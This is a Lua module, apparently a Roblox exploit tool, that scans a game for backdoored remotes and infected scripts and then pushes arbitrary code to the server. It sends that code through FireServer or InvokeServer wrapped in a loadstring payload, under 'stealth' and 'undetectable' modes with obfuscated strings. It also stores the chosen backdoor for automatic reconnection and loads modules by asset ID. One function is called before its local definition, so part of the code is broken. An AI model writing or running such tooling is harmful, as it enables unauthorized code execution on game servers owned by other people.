local _bs = {}
_bs._a = false
_bs._selected = nil
_bs._backup = {}
_bs._monitor = nil
_bs._gameMonitor = nil
_bs._r = {}
_bs._n = {}
_bs._m = {}
_bs._s = tick()
_bs._cb = nil
_bs._currentGameId = nil

-- [NEW] Global storage to persist across reloads
if not _G._pans_backdoor_storage then
    _G._pans_backdoor_storage = {}
end
local _storage = _G._pans_backdoor_storage

local _cfg = {
    debug = false,
    stealth = true,
    maxScanDepth = 20,
    executionDelay = 0.05,
    monitorInterval = 2,
    autoReconnect = true  -- [CHANGED] Auto reconnect enabled
}

local _str = {
    loadstring = ("\108\111\97\100\115\116\114\105\110\103"),
    require = ("\114\101\113\117\105\114\101"),
    RemoteEvent = ("\82\101\109\111\116\101\69\118\101\110\116"),
    RemoteFunction = ("\82\101\109\111\116\101\70\117\110\99\116\105\111\110"),
}

local _pat = {
    "loadstring%(%s*%)%(%)",
    "OnServerEvent%:Connect%(.-loadstring",
    "OnServerInvoke%s*=%s*function.-loadstring",
    "Instance%.new%([\"']RemoteEvent[\"'].-loadstring",
    "getfenv%(%s*%)%[%s*loadstring",
    "setfenv%(.-loadstring",
}

local _cat = {
    normal = {"DataEvent", "UpdateEvent", "RequestEvent", "ResponseEvent", "PlayerEvent", "GameEvent", "Replicate", "Sync", "Remote", "Function", "Callback"},
    suspicious = {"Insert", "Loadstring", "HttpGet", "Run", "Execute", "Script", "Source", "Require", "Module", "Load", "Eval", "RunCode", "Backdoor", "Exploit", "Virus", "Infect"}
}

local function _log(m, t)
    t = t or "INFO"
    if _cfg.debug or t == "ERROR" or t == "FOUND" or t == "DISCONNECT" or t == "LEAVE" or t == "REACTIVATE" then
        print(("[BD:%s] %s"):format(t, m))
    end
    if _bs._cb then _bs._cb(m, t) end
end

local function _isSus(n)
    if not n then return false, 0 end
    n = tostring(n):lower()
    local s = 0
    for _, p in ipairs(_cat.suspicious) do
        if n:find(p:lower()) then s = s + 30 end
    end
    return s > 0, s
end

local function _isNormal(n)
    if not n then return false end
    n = tostring(n):lower()
    for _, p in ipairs(_cat.normal) do
        if n:find(p:lower()) then return true end
    end
    return false
end

local function _analyzeScript(scr)
    if not scr or not scr:IsA("LuaSourceContainer") then return nil end
    
    local info = {
        Object = scr,
        Name = scr.Name,
        Path = scr:GetFullName(),
        SuspiciousPatterns = {},
        RiskScore = 0,
        IsBackdoor = false
    }
    
    local ok, src = pcall(function() return scr.Source end)
    
    if not ok or not src or src == "" then
        local name = tostring(scr.Name):lower()
        if name:find("backdoor") or name:find("exploit") or name:find("virus") then
            info.RiskScore = 100
            info.IsBackdoor = true
            table.insert(info.SuspiciousPatterns, "suspicious_name")
        end
        return info.RiskScore > 50 and info or nil
    end
    
    for _, pattern in ipairs(_pat) do
        if src:find(pattern) then
            table.insert(info.SuspiciousPatterns, pattern)
            info.RiskScore = info.RiskScore + 40
        end
    end
    
    if src:find("Instance%.new%s*%(%s*[\"']Remote") then
        info.RiskScore = info.RiskScore + 50
        table.insert(info.SuspiciousPatterns, "dynamic_remote_creation")
    end
    
    if src:find("getfenv") or src:find("setfenv") then
        info.RiskScore = info.RiskScore + 30
        table.insert(info.SuspiciousPatterns, "env_manipulation")
    end
    
    info.IsBackdoor = info.RiskScore >= 60
    return info.RiskScore > 30 and info or nil
end

local function _scan(i, d)
    d = d or 0
    if d > _cfg.maxScanDepth then return {}, {}, {} end
    
    local rmt = {}
    local scr = {}
    local mdl = {}
    
    local success, isRemote = pcall(function()
        return i:IsA(_str.RemoteEvent) or i:IsA(_str.RemoteFunction)
    end)
    
    if success and isRemote then
        local sus, score = _isSus(i.Name)
        local norm = _isNormal(i.Name)
        local cat = sus and "MALICIOUS" or (norm and "NORMAL" or "UNKNOWN")
        
        local id = ""
        pcall(function() id = i:GetDebugId() end)
        
        table.insert(rmt, {
            Object = i,
            Name = i.Name,
            Type = i.ClassName,
            Path = i:GetFullName(),
            Category = cat,
            RiskScore = score or 0,
            Suspicious = sus,
            Parent = i.Parent,
            Depth = d,
            InstanceId = id
        })
    end
    
    local isScript = pcall(function()
        return i:IsA("Script") or i:IsA("LocalScript") or i:IsA("ModuleScript")
    end)
    
    if isScript then
        local analysis = _analyzeScript(i)
        if analysis then
            table.insert(scr, analysis)
        end
    end
    
    local isModel = pcall(function()
        return i:IsA("Model") or i:IsA("Folder")
    end)
    
    if isModel then
        local children = {}
        pcall(function() children = i:GetDescendants() end)
        
        for _, desc in ipairs(children) do
            local isServerScript = pcall(function()
                return desc:IsA("Script") and desc.RunContext == Enum.RunContext.Server
            end)
            
            if isServerScript then
                local n = tostring(desc.Name)
                if #n > 50 or n:find("[\128-\255]") or n:match("^%s+$") or not desc.Archivable then
                    table.insert(mdl, {Model = i, Script = desc, Reason = "hidden_server"})
                    break
                end
            end
        end
    end
    
    local children = {}
    pcall(function() children = i:GetChildren() end)
    
    for _, c in ipairs(children) do
        local cr, cs, cm = _scan(c, d + 1)
        for _, v in ipairs(cr) do table.insert(rmt, v) end
        for _, v in ipairs(cs) do table.insert(scr, v) end
        for _, v in ipairs(cm) do table.insert(mdl, v) end
    end
    
    return rmt, scr, mdl
end

local function _test(r, depth)
    depth = depth or 0
    if depth > 3 then return false, nil, 0 end
    
    local v = false
    local m = nil
    local c = r.RiskScore or 0
    
    local p = r.Parent
    if p then
        local pn = tostring(p.Name):lower()
        if pn:find("backdoor") or pn:find("exploit") or pn:find("virus") then
            v = true
            m = "infected_container"
            c = c + 50
        end
        
        local isModel = pcall(function() return p:IsA("Model") end)
        if isModel then
            local children = {}
            pcall(function() children = p:GetDescendants() end)
            
            for _, d in ipairs(children) do
                local isScript = pcall(function() return d:IsA("Script") end)
                if isScript then
                    local dn = tostring(d.Name)
                    if dn:sub(1,1) == "\0" or dn:find("\239\191\189") then
                        v = true
                        m = m or "hidden_script"
                        c = c + 40
                        r.InfectedModel = p
                        break
                    end
                end
            end
        end
    end
    
    if r.Category == "MALICIOUS" then
        v = true
        m = m or "categorized_malicious"
        c = c + 30
    end
    
    local ok, attrs = pcall(function()
        return r.Object:GetAttribute("Backdoor") or r.Object:GetAttribute("Exploit")
    end)
    if ok and attrs then
        v = true
        m = m or "marked_attribute"
        c = c + 100
    end
    
    return v, m, c
end

local function _selectRandomBackdoor(backdoors)
    if #backdoors == 0 then return nil, {} end
    if #backdoors == 1 then return backdoors[1], {} end
    
    math.randomseed(tick())
    local selectedIndex = math.random(1, #backdoors)
    local selected = backdoors[selectedIndex]
    
    local backup = {}
    for i, bd in ipairs(backdoors) do
        if i ~= selectedIndex then
            table.insert(backup, bd)
        end
    end
    
    return selected, backup
end

-- [NEW] Find backdoor by stored path (for reactivation)
local function _findBackdoorByPath(path)
    if not path then return nil end
    
    -- Try to find the remote by path
    local segments = {}
    for segment in string.gmatch(path, "[^%.]+") do
        table.insert(segments, segment)
    end
    
    local current = game
    for i, segment in ipairs(segments) do
        if segment == "game" then
            current = game
        else
            local found = nil
            local children = {}
            pcall(function() children = current:GetChildren() end)
            
            for _, child in ipairs(children) do
                if child.Name == segment then
                    found = child
                    break
                end
            end
            
            if not found then
                -- Try service
                local ok, svc = pcall(function() return game:GetService(segment) end)
                if ok and svc then
                    found = svc
                else
                    return nil
                end
            end
            
            current = found
        end
    end
    
    -- Verify it's still a valid remote
    local isValid = pcall(function()
        return current:IsA("RemoteEvent") or current:IsA("RemoteFunction")
    end)
    
    if isValid then
        return {
            Object = current,
            Name = current.Name,
            Type = current.ClassName,
            Path = path,
            Category = "MALICIOUS",
            Vulnerable = true,
            ExecutionMethod = "reactivated"
        }
    end
    
    return nil
end

-- Monitor backdoor object
local function _startMonitoring()
    if _bs._monitor then
        pcall(function() _bs._monitor:Disconnect() end)
        _bs._monitor = nil
    end
    
    if not _bs._selected or not _bs._selected.Object then
        _log("No backdoor to monitor", "WARN")
        return
    end
    
    local target = _bs._selected.Object
    local parent = target.Parent
    local name = target.Name
    local path = _bs._selected.Path
    
    -- Store in global for persistence
    _storage.selectedPath = path
    _storage.selectedType = _bs._selected.Type
    
    _log("Monitoring: " .. path, "MONITOR")
    
    local lastCheck = tick()
    local rs = game:GetService("RunService")
    
    _bs._monitor = rs.Heartbeat:Connect(function()
        if tick() - lastCheck < _cfg.monitorInterval then return end
        lastCheck = tick()
        
        local exists, currentParent, currentName = pcall(function()
            return target.Parent, target.Name
        end)
        
        if not exists then
            _log("BACKDOOR_REMOVED: " .. path, "DISCONNECT")
            _storage.selectedPath = nil
            _bs.Disconnect()
            return
        end
        
        if currentParent ~= parent then
            _log("BACKDOOR_MOVED: " .. path, "DISCONNECT")
            _storage.selectedPath = nil
            _bs.Disconnect()
            return
        end
        
        if currentName ~= name then
            _log("BACKDOOR_RENAMED: " .. path, "DISCONNECT")
            _storage.selectedPath = nil
            _bs.Disconnect()
            return
        end
    end)
end

-- Monitor for game leave/change
local function _startGameMonitoring()
    if _bs._gameMonitor then
        pcall(function() _bs._gameMonitor:Disconnect() end)
        _bs._gameMonitor = nil
    end
    
    _bs._currentGameId = tostring(game.GameId)
    _log("Game monitoring started. GameId: " .. _bs._currentGameId, "MONITOR")
    
    local rs = game:GetService("RunService")
    local lastGameCheck = tick()
    
    _bs._gameMonitor = rs.Heartbeat:Connect(function()
        if tick() - lastGameCheck < 1 then return end
        lastGameCheck = tick()
        
        local currentGameId = tostring(game.GameId)
        if currentGameId ~= _bs._currentGameId then
            _log("GAME_CHANGED: " .. _bs._currentGameId .. " -> " .. currentGameId, "LEAVE")
            _storage.selectedPath = nil  -- Clear stored path
            print("PANS_PLAYER_LEFT:GameChanged")
            _bs.Disconnect()
            return
        end
    end)
    
    pcall(function()
        game:BindToClose(function()
            _log("GAME_CLOSING", "LEAVE")
            _storage.selectedPath = nil
            print("PANS_PLAYER_LEFT:GameClosed")
            _bs.Disconnect()
        end)
    end)
    
    local players = game:GetService("Players")
    local localPlayer = players.LocalPlayer
    
    if localPlayer then
        localPlayer.Destroying:Connect(function()
            _log("PLAYER_DESTROYING", "LEAVE")
            _storage.selectedPath = nil
            print("PANS_PLAYER_LEFT:PlayerDestroyed")
            _bs.Disconnect()
        end)
        
        local lastParent = localPlayer.Parent
        localPlayer:GetPropertyChangedSignal("Parent"):Connect(function()
            if localPlayer.Parent == nil and lastParent ~= nil then
                _log("PLAYER_PARENT_NIL", "LEAVE")
                _storage.selectedPath = nil
                print("PANS_PLAYER_LEFT:ParentNil")
                _bs.Disconnect()
            end
            lastParent = localPlayer.Parent
        end)
    end
end

local function _stopMonitoring()
    if _bs._monitor then
        pcall(function() _bs._monitor:Disconnect() end)
        _bs._monitor = nil
    end
    if _bs._gameMonitor then
        pcall(function() _bs._gameMonitor:Disconnect() end)
        _bs._gameMonitor = nil
    end
    _bs._currentGameId = nil
end

-- [NEW] Direct execution without active check (fallback)
local function _directExecute(code, backdoorInfo)
    if not backdoorInfo or not backdoorInfo.Object then
        return false
    end
    
    local r = backdoorInfo.Object
    local t = backdoorInfo.Type
    
    local exists = pcall(function() return r.Parent end)
    if not exists then
        return false
    end
    
    local function tryExecute()
        if t == _str.RemoteEvent then
            pcall(function() r:FireServer(code) end)
        else
            pcall(function() r:InvokeServer(code) end)
        end
    end
    
    return pcall(tryExecute)
end

-- [MODIFIED] Execute with auto-reactivation
function _bs.Execute(code)
    -- First check if we have an active backdoor
    if _bs._a and _bs._selected then
        _log("Executing through active backdoor...", "EXEC")
        return _undetectableExec(code)
    end
    
    -- [NEW] Try to reactivate from storage
    if _storage.selectedPath then
        _log("Attempting reactivation from storage: " .. _storage.selectedPath, "REACTIVATE")
        
        local restored = _findBackdoorByPath(_storage.selectedPath)
        if restored then
            _bs._selected = restored
            _bs._a = true
            
            -- Restart monitoring
            _startMonitoring()
            
            _log("Reactivated successfully!", "REACTIVATE")
            return _undetectableExec(code)
        else
            _log("Stored backdoor no longer exists", "REACTIVATE")
            _storage.selectedPath = nil
        end
    end
    
    -- [NEW] Last resort: try quick scan
    if _cfg.autoReconnect then
        _log("Attempting quick scan for reactivation...", "REACTIVATE")
        
        local found = _bs.QuickScan()
        if found and _bs._selected then
            _bs._a = true
            _startMonitoring()
            _log("Quick reactivation successful!", "REACTIVATE")
            return _undetectableExec(code)
        end
    end
    
    _log("Backdoor not active and reactivation failed", "ERROR")
    return false
end

-- [NEW] Quick scan for reactivation (faster than full scan)
function _bs.QuickScan()
    -- Only scan common locations
    local quickServices = {
        game:GetService("ReplicatedStorage"),
        game:GetService("Workspace")
    }
    
    local foundRemotes = {}
    
    for _, svc in ipairs(quickServices) do
        local children = {}
        pcall(function() children = svc:GetDescendants() end)
        
        for _, obj in ipairs(children) do
            local isRemote = pcall(function()
                return obj:IsA("RemoteEvent") or obj:IsA("RemoteFunction")
            end)
            
            if isRemote then
                local sus, score = _isSus(obj.Name)
                if sus then
                    table.insert(foundRemotes, {
                        Object = obj,
                        Name = obj.Name,
                        Type = obj.ClassName,
                        Path = obj:GetFullName(),
                        Category = "MALICIOUS",
                        RiskScore = score,
                        Vulnerable = true,
                        ExecutionMethod = "quick_reactivate"
                    })
                end
            end
        end
    end
    
    if #foundRemotes > 0 then
        local selected, backup = _selectRandomBackdoor(foundRemotes)
        _bs._selected = selected
        _bs._backup = backup
        return true
    end
    
    return false
end

-- Undetectable execution
local function _undetectableExec(code)
    if not _bs._selected then
        _log("No backdoor selected", "ERROR")
        return false
    end
    
    local r = _bs._selected.Object
    local t = _bs._selected.Type
    
    local exists = pcall(function() return r.Parent end)
    if not exists then
        _log("Backdoor no longer exists!", "ERROR")
        _bs.Disconnect()
        return false
    end
    
    local function method1()
        if t == _str.RemoteEvent then
            pcall(function() r:FireServer(code) end)
        else
            pcall(function() r:InvokeServer(code) end)
        end
    end
    
    local function method4()
        local payload = ([[
            local _c = "%s"
            local _f = loadstring or load
            if _f then pcall(_f, _c) end
        ]]):format(code:gsub("\"", "\\\""))
        
        if t == _str.RemoteEvent then
            pcall(function() r:FireServer(payload) end)
        else
            pcall(function() r:InvokeServer(payload) end)
        end
    end
    
    if _cfg.stealth then
        local ok1 = pcall(method4)
        if ok1 then return true end
        local ok2 = pcall(method1)
        return ok2
    else
        local ok = pcall(method1)
        return ok
    end
end

function _bs.Scan()
    _log("Starting scan...", "SCAN")
    _bs._r = {}
    _bs._n = {}
    _bs._m = {}
    _bs._selected = nil
    _bs._backup = {}
    _bs._s = tick()
    
    local services = {}
    local serviceNames = {"ReplicatedStorage", "ReplicatedFirst", "StarterGui", "StarterPack", "StarterPlayer", "Workspace"}
    
    for _, name in ipairs(serviceNames) do
        local ok, svc = pcall(function() return game:GetService(name) end)
        if ok and svc then
            table.insert(services, svc)
        end
    end
    
    local allR = {}
    local allS = {}
    local allM = {}
    
    for _, svc in ipairs(services) do
        local ar, as, am = _scan(svc)
        for _, v in ipairs(ar) do table.insert(allR, v) end
        for _, v in ipairs(as) do table.insert(allS, v) end
        for _, v in ipairs(am) do table.insert(allM, v) end
    end
    
    _log(("Found %d remotes, %d scripts"):format(#allR, #allS), "SCAN")
    
    for _, r in ipairs(allR) do
        if r.Category == "NORMAL" then
            table.insert(_bs._n, r)
        else
            local isV, method, conf = _test(r, 0)
            if isV then
                r.Vulnerable = true
                r.ExecutionMethod = method
                r.Confidence = conf
                table.insert(_bs._r, r)
            else
                table.insert(_bs._n, r)
            end
        end
    end
    
    for _, s in ipairs(allS) do
        if s.IsBackdoor then
            local id = ""
            pcall(function() id = s.Object:GetDebugId() end)
            
            table.insert(_bs._r, {
                Object = s.Object,
                Name = s.Name,
                Type = "ScriptBackdoor",
                Path = s.Path,
                Category = "MALICIOUS",
                Vulnerable = true,
                ExecutionMethod = "script_source",
                Confidence = s.RiskScore,
                ScriptInfo = s,
                InstanceId = id
            })
        end
    end
    
    if #_bs._r > 0 then
        local selected, backup = _selectRandomBackdoor(_bs._r)
        _bs._selected = selected
        _bs._backup = backup
        
        if selected then
            _log(("Selected: %s [%d%%]"):format(selected.Path, selected.Confidence or 0), "SELECT")
        end
    end
    
    for _, m in ipairs(allM) do
        table.insert(_bs._m, m)
    end
    
    return _bs._selected ~= nil, #_bs._n
end

-- [MODIFIED] Require with auto-reactivation
function _bs.Require(mid)
    if type(mid) == "number" then mid = tostring(mid) end
    
    local requireCode = ([[
        local s,r=pcall(function()local m=require(%s)return m end)
        if s then print("[BD] Loaded:",r)return r else warn("[BD] Fail:",r)end
    ]]):format(mid)
    
    -- Use Execute which now has auto-reactivation
    return _bs.Execute(requireCode)
end

function _bs.Initialize(cb, cfg)
    _bs._cb = cb
    if cfg then for k,v in pairs(cfg) do _cfg[k] = v end end
    
    -- [NEW] Check if we have stored backdoor from previous session
    if _storage.selectedPath then
        _log("Found stored backdoor: " .. _storage.selectedPath, "INIT")
    end
    
    _log("Initialized (Auto-Reconnect Enabled)", "INIT")
    return _bs
end

function _bs.Activate()
    if _bs._selected then
        _bs._a = true
        print(("PANS_BACKDOOR_ACTIVE:1:%s:%s"):format(_bs._selected.Path, _bs._selected.Type))
        print(("PANS_BACKDOOR_SELECTED:%s:%s:%s"):format(_bs._selected.Path, _bs._selected.Type, _bs._selected.ExecutionMethod or "direct"))
        
        _startMonitoring()
        _startGameMonitoring()
        
        _log("Active and monitored", "ACTIVE")
        return true
    end
    _log("No backdoor selected", "ERROR")
    return false
end

function _bs.Disconnect()
    _stopMonitoring()
    _bs._a = false
    local oldPath = "unknown"
    if _bs._selected then
        oldPath = _bs._selected.Path
    end
    _bs._selected = nil
    print("PANS_BACKDOOR_DISCONNECTED:" .. oldPath)
    _log("Disconnected: " .. oldPath, "DISCONNECT")
end

function _bs.GetStatus()
    return {
        Active = _bs._a,
        HasSelection = _bs._selected ~= nil,
        SelectedPath = _bs._selected and _bs._selected.Path or nil,
        StoredPath = _storage.selectedPath,  -- [NEW]
        BackupCount = #_bs._backup,
        NormalRemotes = #_bs._n,
        ScanTime = tick() - _bs._s,
        CurrentGameId = _bs._currentGameId
    }
end

function _bs.GetSelected()
    return _bs._selected
end

function _bs.GetBackups()
    return _bs._backup
end

return _bs
